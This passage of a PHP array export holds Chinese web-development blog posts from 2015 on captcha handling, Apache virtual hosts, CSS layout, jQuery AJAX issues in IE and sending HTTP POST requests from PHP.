18px;\\"><strong>验证码安全性</strong></span></p><p>&nbsp;&nbsp;&nbsp;&nbsp;这是我刚想到的一点，来补充一下。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;验证码通常是由php脚本生成的随机字符串，通过GD库的处理，制作成图片。真正的验证码字符串保存在SESSION中，然后把生成的图片展示给用户。用户填写了验证码提交后，在服务端上SESSION中的验证码进行比对。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;由此想到了我之前犯过的一个错误。验证码比对完成之后，不管是正确还是错误，我都没有清理SESSION。这样产生了一个问题，一旦一个用
 
户第一次提交验证码成功，第二次以后不再访问生成验证码的脚本，这时候SESSION中的验证码并没有更新，也没有删除，导致验证码重复使用，起不到验证
 的作用。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;再就说到了验证码被识别的问题，wordpress包括emlog的程序我经常会借鉴，但他们所使用的验证码我却不敢恭维。很多垃圾评论都是验证码被机器识别后产生的，所以我后来也使用了一个复杂一点的验证码，据说是w3c推荐使用的。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;如果大家需要，可以到这里下载<a title=\\"\\" href=\\"http://pan.baidu.com/s/1bnb8Zmf\\" target=\\"_blank\\">http://pan.baidu.com/s/1bnb8Zmf</a></p><p>&nbsp; &nbsp;好了，我能想到的，也是在实际运用中用到的东西也就这么多了。这也仅仅是我自己写代码中积累的一些对代码安全性的一个见解，如果大家还有更好的想法，可以和我交流。希望大家也能写出更安全的代码。</p><p>&nbsp;</p><p>转自：http://www.freebuf.com/articles/web/38383.html</p><p><br/></p>',
            'keyword' => 'php安全',
            'sortid' => '6',
            'img' => '',
            'views' => '0',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-18 11:37:27',
          ),
          71 => 
          array (
            'id' => '14',
            'uid' => '1',
            'title' => '本地虚拟主机的配置',
            'content' => '<p>本地PHP环境配置好后，我们只需访问 http://localhost/项目名 就能访问到本地的PHP项目了。但是有时候我们想要模拟用域名来访问项目的效果，这时候我们就可以配置Apache虚拟主机来达到我们的目的.</p><p>1、首先配置C:Windows/System32/drivers/etc目录下的HOSTS文件，我们可以用记事本或Notepad等相应软件打开文件进行编辑，加入你想设置的域名：</p><pre class=\\"\\\\\\\\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\"brush:php;toolbar:false\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\"\\\\\\\\\\"\\">127.0.0.1&nbsp;&nbsp;&nbsp;www.ar.com</pre><p>2、打开本地PHP集成环境的Apache目录即F:/xampplite/apache/conf目录下的httpd.conf文件，查找“ Include conf/extra/httpd-vhosts.conf”，去掉配置前的“#”号 确保引入了 vhosts 虚拟主机配置文件：</p><p><img src=\\"/public/upload/image/20150918/1442547402699696.png\\" title=\\"1442547402699696.png\\" alt=\\"1.png\\"/></p><p>3、打开本地PHP集成环境的Apache目录即F:/xampplite/apache/conf/extra目录下的httpd-vhosts.conf文件，查找“NameVirtualHost *:80”，去掉配置前的“#”号， 确保启用了 vhosts.conf：</p><p><img src=\\"/public/upload/image/20150918/1442547409940846.png\\" title=\\"1442547409940846.png\\" alt=\\"2.png\\"/></p><p>注意：开启了httpd-vhosts.conf，默认的httpd.conf默认配置会失效， 当访问此IP的域名将全部指向 vhosts.conf 中的第一个虚拟主机。此时需要在httpd.conf文件中重新配置域名的localhost的目录：</p><pre class=\\"\\\\\\\\\\"brush:php;toolbar:false\\\\\\\\\\"\\">&lt;VirtualHost&nbsp;127.0.0.1:80&gt;
&nbsp;&nbsp;&nbsp;&nbsp;ServerAdmin&nbsp;webmaster@dummy-host2.example.com
&nbsp;&nbsp;&nbsp;&nbsp;DocumentRoot&nbsp;F:\\\\\\\\xampplite\\\\\\\\htdocs\\\\\\\\artistrise\\\\\\\\public
&nbsp;&nbsp;&nbsp;&nbsp;ServerName&nbsp;www.ar.com&nbsp;
&lt;/VirtualHost&gt;</pre><p>4、重启Apache服务。这样就完成了Apache的虚拟主机配置，实现本地PHP项目域名访问。在浏览器的地址栏输入www.ar.com就能访问指定绑定的本地PHP项目了。<br/></p>',
            'keyword' => '虚拟主机',
            'sortid' => '5',
            'img' => '',
            'views' => '0',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-18 11:33:06',
          ),
          72 => 
          array (
            'id' => '13',
            'uid' => '1',
            'title' => '固定在屏幕下方的div，不滚动',
            'content' => '<pre class=\\"brush:html;toolbar:false\\">&lt;html&nbsp;xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;head&nbsp;runat=&quot;server&quot;&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;title&gt;&lt;/title&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;style&nbsp;type=&quot;text/css&quot;&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;html,body{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;padding:0;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;margin:0;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#low_right{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;position:&nbsp;fixed;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;width:&nbsp;100%;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;height:&nbsp;90px;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;background:&nbsp;#eee;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;background-color:&nbsp;#DCFCE9;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;text-align:&nbsp;center;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;bottom:0;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;left:0;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;right:0;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/style&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;/head&gt;
&lt;body&gt;
&lt;script&nbsp;type=&quot;text/javascript&quot;&gt;
&nbsp;&nbsp;&nbsp;&nbsp;
&lt;/script&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;div&nbsp;style=&quot;width:100%;height:500px;background:#FFE7BA&quot;&gt;&lt;/div&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;div&nbsp;style=&quot;width:100%;height:500px;background:#FFAEB9&quot;&gt;&lt;/div&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;div&nbsp;style=&quot;width:100%;height:500px;background:#CDCDB4&quot;&gt;&lt;/div&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;div&nbsp;id=&quot;low_right&quot;&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;右下角
&nbsp;&nbsp;&nbsp;&nbsp;&lt;/div&gt;

&lt;/body&gt;
&lt;/html&gt;</pre><p><br/></p>',
            'keyword' => 'div,滚动',
            'sortid' => '7',
            'img' => '',
            'views' => '2',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-18 11:31:00',
          ),
          73 => 
          array (
            'id' => '12',
            'uid' => '1',
            'title' => 'php生成验证码，生成值和session里面的验证码值不一样',
            'content' => '<p><span style=\\"font-size: 18px; background-color: #cccccc;\\"><span style=\\"background-color: #ffffff; color: #000000;\\">今天写项目的时候，发现注册的时候验证码怎么弄都不正确，通过使用FireBug和打印Session发现，同一时间的验证码值不一样，这是什么原因呢？</span><br/></span></p><p><span style=\\"font-size: 18px; background-color: #cccccc;\\"><span style=\\"background-color: #ffffff; color: #000000;\\">经过多次测试发现获取到的验证码多加载了一次，于是</span></span></p><pre class=\\"brush:html;toolbar:false\\">&lt;a&nbsp;href=&quot;#&quot;&nbsp;onclick=&quot;javascript:code();return&nbsp;false;&quot;&gt;</pre><p>添加了return false; 后好了</p><p><br/></p>',
            'keyword' => '验证码',
            'sortid' => '1',
            'img' => '',
            'views' => '2',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-18 11:16:17',
          ),
          74 => 
          array (
            'id' => '11',
            'uid' => '1',
            'title' => '关于jQuery的AJAX不兼容IE的解决办法',
            'content' => '<p><span style=\\"font-size: 16px;\\">在使用jQuery的AJAX：get方法去检测数据是否存在时，会发现IE会出现不兼容的情况。</span></p><p><span style=\\"font-size: 16px;\\">&nbsp;</span></p><p><span style=\\"font-size: 16px;\\">用AJAX:post方法时，使用Chrome/FireFox/IE均能出现正确的结果，但是在使用AJAX:get方法时，IE却不能返回正确的结果。</span></p><p><span style=\\"font-size: 16px;\\">&nbsp;</span></p><p><span style=\\"font-size: 16px;\\">难道是数据超出了get方法的限制的长度，这个也不可能，我总共才传了一点点数据。排除。</span></p><p><span style=\\"font-size: 16px;\\">&nbsp;</span></p><p><span style=\\"font-size: 16px;\\">网上一些网友说是IE缓存的问题，在请求数据后边加上随机数就行，比如加上时间数new Date().getTime()。</span></p><p><span style=\\"font-size: 16px;\\">先前的代码中我已经添加了随机数，用的是“Math.random()”也不行。难道用时间比较靠谱？</span></p><p><span style=\\"font-size: 16px;\\">&nbsp;</span></p><p><span style=\\"font-size: 16px;\\">那就改成获取时间试试，在参数后加“new Date().getTime()”后反复测试还是不行，真是百思不得其解！这个错误也排除了。</span></p><p><span style=\\"font-size: 16px;\\">&nbsp;</span></p><p><span style=\\"font-size: 16px;\\">反复查看手册后发现请求的数据格式还是有一种JSON格式，如{foo:[&quot;bar1&quot;, &quot;bar2&quot;]} ，然后就按照这种格式书写，还真的返回了正确的查询结果。真不知道IE还有这点要求。（完）</span></p><p><span style=\\"font-size: 16px;\\">&nbsp;</span></p><p><span style=\\"font-size: 16px;\\">先前的格式：</span></p><p><strong><span style=\\"font-size: 16px; color: #6f3198;\\">&nbsp;&nbsp;&nbsp;&nbsp;type: &quot;get&quot;,</span></strong></p><p><span style=\\"line-height: 21px;\\"><strong><span style=\\"font-size: 16px; color: #4d6df3;\\">&nbsp;&nbsp;&nbsp;&nbsp;data: &quot;bid=&quot;+my_bid+&quot;&amp;name_cn=&quot;+name_cn+&quot;&amp;timeStamp=&quot;+new Date().getTime(),</span></strong></span></p><p><span style=\\"font-size: 16px;\\">改进后格式：</span></p><p><strong><span style=\\"font-size: 16px; color: #6f3198;\\">&nbsp;&nbsp;&nbsp;&nbsp;type: &quot;get&quot;,</span></strong></p><p><strong><span style=\\"font-size: 16px; color: #6f3198;\\">&nbsp;&nbsp;&nbsp;&nbsp;data: {&#39;bid&#39;:my_bid,&#39;name_cn&#39;:name_cn,&#39;timeStamp&#39;:new Date().getTime()},</span></strong></p><p><span style=\\"font-size: 16px;\\">&nbsp;</span></p><p><span style=\\"font-size: 16px;\\">在jQuery手册中是这样描述的：</span></p><p><em><span style=\\"font-size: 16px;\\">data Object,String</span></em></p><p><em><span style=\\"font-size: 16px;\\">发送到服务器的数据。将自动转换为请求字符串格式。GET 请求中将附加在 URL 后。</span></em></p><p><em><span style=\\"font-size: 16px;\\">查看 processData 选项说明以禁止此自动转换。必须为 Key/Value 格式。</span></em></p><p><em><span style=\\"font-size: 16px;\\">如果为数组，jQuery 将自动为不同值对应同一个名称。如 {foo:[&quot;bar1&quot;, &quot;bar2&quot;]} 转换为 &quot;&amp;foo=bar1&amp;foo=bar2&quot;。</span></em></p><p><span style=\\"font-size: 16px;\\">&nbsp;</span></p><p><strong><span style=\\"font-size: 16px;\\">代码片段:</span></strong></p><pre class=\\"brush:js;toolbar:false\\">var&nbsp;siteUrl=&quot;http://blog.sina.com.cn/cnwyt&quot;;&nbsp;
jQuery.ajax({
type:&nbsp;&quot;get&quot;,
url:&nbsp;siteUrl+&quot;cosmetics/product/ajax_check?&quot;,
//data:&nbsp;&quot;bid=&quot;+my_bid+&quot;&amp;name_cn=&quot;+name_cn+&quot;&amp;timeStamp=&quot;&nbsp;+&nbsp;new&nbsp;Date().getTime(),
data:&nbsp;{&#39;bid&#39;:my_bid,&#39;name_cn&#39;:name_cn,&#39;timeStamp&#39;:new&nbsp;Date().getTime()},
dataType:&nbsp;&#39;json&#39;,
error:&nbsp;function&nbsp;(err)&nbsp;{&nbsp;alert(&#39;网络故障,请与管理员联系！&#39;)&nbsp;},
success:&nbsp;function&nbsp;(message)&nbsp;{
if(message!=false){
//ture的代码
}else{
//false的代码
}
});</pre><p><strong><span style=\\"font-size: 16px;\\"></span></strong><br/></p><p><span style=\\"font-size: 16px;\\">&nbsp;</span></p><p><strong><span style=\\"font-size: 16px;\\">参考链接：</span></strong></p><p><strong><span style=\\"font-size: 16px;\\">&nbsp;</span></strong></p><p><span style=\\"font-size: 16px;\\">jQuery 的 .get和.post和.ajax方法IE的兼容问题&nbsp;</span></p><p><span style=\\"font-size: 16px;\\">http://blog.csdn.net/muziduoxi/article/details/7541800</span></p><p><span style=\\"font-size: 16px;\\">&nbsp;</span></p><p><span style=\\"font-size: 16px;\\">jquery ajax在IE下失效</span></p><p><span style=\\"font-size: 16px;\\">http://www.im87.cn/blog/256</span></p><p>&nbsp;</p><p><span style=\\"font-size: 16px;\\">转自：http://blog.sina.com.cn/s/blog_6c971aa301014mva.html</span></p><p><br/></p>',
            'keyword' => 'jquery,ajax',
            'sortid' => '7',
            'img' => '',
            'views' => '0',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-18 11:14:38',
          ),
          75 => 
          array (
            'id' => '10',
            'uid' => '1',
            'title' => 'IE浏览器下 提示js错误缺少标识符、字符串或数字解决办法',
            'content' => '<p>&nbsp;&nbsp;&nbsp;&nbsp;今天写js的时候发现了点问题，我一直是使用的firfox浏览器，所以我这里是没有问题的，但是同事说js不执行，我拿ie的调试工具一看，报缺少标识符、字符串或数字；但是在firfox和google下都是可以的，经过不懈的搜索发现是多了一个逗号。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;原因及解决方法<br/> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1.原因：一般出现在类的定义时在最后一个属性或方法后加了逗号，在Firefox是无所谓的，而IE下就会出错，而且提示得云里雾里，要除错都很难。&nbsp;</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2.解决方法:去掉这个逗号…..</p><p>&nbsp;&nbsp;&nbsp;&nbsp;按照上面的提示，逐步排除js代码段以及js文件，发现还正是在类定义最后一个属性后加了一个逗号，去除，解决。</p><p><br/></p>',
            'keyword' => 'IE,缺少标识符',
            'sortid' => '7',
            'img' => '',
            'views' => '0',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-18 11:12:50',
          ),
          76 => 
          array (
            'id' => '9',
            'uid' => '1',
            'title' => '（转）使用用PHP发送HTTP请求（POST请求、GET请求）',
            'content' => '<p><span style=\\"color: #ff0000;\\"><strong>file_get_contents版本：</strong></span><br/></p><pre class=\\"brush:php;toolbar:false\\">&lt;?php
&nbsp;&nbsp;&nbsp;&nbsp;/**
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;发送post请求
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;@param&nbsp;string&nbsp;$url&nbsp;请求地址
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;@param&nbsp;array&nbsp;$post_data&nbsp;post键值对数据
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;@return&nbsp;string
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/
&nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;send_post($url,&nbsp;$post_data)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$postdata&nbsp;=&nbsp;http_build_query($post_data);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$options&nbsp;=&nbsp;array(
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;http&#39;&nbsp;=&gt;&nbsp;array(
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;method&#39;&nbsp;=&gt;&nbsp;&#39;POST&#39;,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;header&#39;&nbsp;=&gt;&nbsp;&#39;Content-type:application/x-www-form-urlencoded&#39;,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;content&#39;&nbsp;=&gt;&nbsp;$postdata,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;timeout&#39;&nbsp;=&gt;&nbsp;15&nbsp;*&nbsp;60&nbsp;//&nbsp;超时时间（单位:s）
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$context&nbsp;=&nbsp;stream_context_create($options);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$result&nbsp;=&nbsp;file_get_contents($url,&nbsp;false,&nbsp;$context);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;$result;
&nbsp;&nbsp;&nbsp;&nbsp;}</pre><p>使用如下：</p><pre class=\\"brush:php;toolbar:false\\">$post_data&nbsp;=&nbsp;array(&nbsp;&nbsp;&nbsp;&nbsp;&#39;username&#39;&nbsp;=&gt;&nbsp;&#39;stclair2201&#39;,
&nbsp;&nbsp;&nbsp;&nbsp;&#39;password&#39;&nbsp;=&gt;&nbsp;&#39;handan&#39;);
send_post(&#39;http://blog.snsgou.com&#39;,&nbsp;$post_data);</pre><p><strong>实战经验：</strong></p><p><strong>当我利用上述代码给另一台服务器发送http请求时，发现，如果服务器处理请求时间过长，本地的PHP会中断请求，即所谓的超时中断，第一个怀疑的是PHP本身执行时间的超过限制，但想想也不应该，因为老早就按照这篇文章设置了“PHP执行时间限制”（</strong><strong><a href=\\"http://blog.snsgou.com/post-163.html\\" target=\\"_blank\\">【推荐】PHP上传文件大小限制大全</a></strong><strong> ），仔细琢磨，想想，应该是http请求本身的一个时间限制，于是乎，就想到了怎么给http请求时间限制搞大一点。。。。。。查看PHP手册，果真有个参数 “ timeout ”，默认不知道多大，当把它的值设大一点，问题得已解决，弱弱地做个笔记~~~</strong></p><p><span style=\\"color: #ff0000;\\"><strong>Socket版本:</strong></span></p><pre class=\\"brush:php;toolbar:false\\">/**
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;Socket版本
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;使用方法：
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;$post_string&nbsp;=&nbsp;&quot;app=socket&amp;amp;version=beta&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;request_by_socket(&#39;blog.snsgou.com&#39;,&nbsp;&#39;/restServer.php&#39;,&nbsp;$post_string);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/
&nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;request_by_socket($remote_server,$remote_path,$post_string,$port&nbsp;=&nbsp;80,$timeout&nbsp;=&nbsp;30)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$socket&nbsp;=&nbsp;fsockopen($remote_server,&nbsp;$port,&nbsp;$errno,&nbsp;$errstr,&nbsp;$timeout);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(!$socket)&nbsp;die(&quot;$errstr($errno)&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fwrite($socket,&nbsp;&quot;POST&nbsp;$remote_path&nbsp;HTTP/1.0&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fwrite($socket,&nbsp;&quot;User-Agent:&nbsp;Socket&nbsp;Example&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fwrite($socket,&nbsp;&quot;HOST:&nbsp;$remote_server&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fwrite($socket,&nbsp;&quot;Content-type:&nbsp;application/x-www-form-urlencoded&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fwrite($socket,&nbsp;&quot;Content-length:&nbsp;&quot;&nbsp;.&nbsp;（strlen($post_string)&nbsp;+&nbsp;8）&nbsp;.&nbsp;&quot;&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fwrite($socket,&nbsp;&quot;Accept:*/*&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fwrite($socket,&nbsp;&quot;&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fwrite($socket,&nbsp;&quot;mypost=$post_string&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fwrite($socket,&nbsp;&quot;&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$header&nbsp;=&nbsp;&quot;&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;($str&nbsp;=&nbsp;trim(fgets($socket,&nbsp;4096)))&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$header&nbsp;.=&nbsp;$str;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$data&nbsp;=&nbsp;&quot;&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;(!feof($socket))&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$data&nbsp;.=&nbsp;fgets($socket,&nbsp;4096);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;$data;
&nbsp;&nbsp;&nbsp;&nbsp;}</pre><p><span style=\\"color: #ff0000;\\"><strong>Curl版本:</strong></span><br/></p><pre class=\\"brush:php;toolbar:false\\">/**
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;Curl版本
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;使用方法：
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;$post_string&nbsp;=&nbsp;&quot;app=request&amp;version=beta&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;request_by_curl(&#39;http://blog.snsgou.com/restServer.php&#39;,&nbsp;$post_string);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/
&nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;request_by_curl($remote_server,&nbsp;$post_string)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ch&nbsp;=&nbsp;curl_init();
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;curl_setopt($ch,&nbsp;CURLOPT_URL,&nbsp;$remote_server);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;curl_setopt($ch,&nbsp;CURLOPT_POSTFIELDS,&nbsp;&#39;mypost=&#39;&nbsp;.&nbsp;$post_string);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;curl_setopt($ch,&nbsp;CURLOPT_RETURNTRANSFER,&nbsp;true);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;curl_setopt($ch,&nbsp;CURLOPT_USERAGENT,&nbsp;&quot;snsgou.com&#39;s&nbsp;CURL&nbsp;Example&nbsp;beta&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$data&nbsp;=&nbsp;curl_exec($ch);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;curl_close($ch);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;$data;
&nbsp;&nbsp;&nbsp;&nbsp;}</pre><p><span style=\\"color: #ff0000;\\"><strong>Curl版本(2)</strong></span></p><pre class=\\"brush:php;toolbar:false\\">/**
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;发送HTTP请求
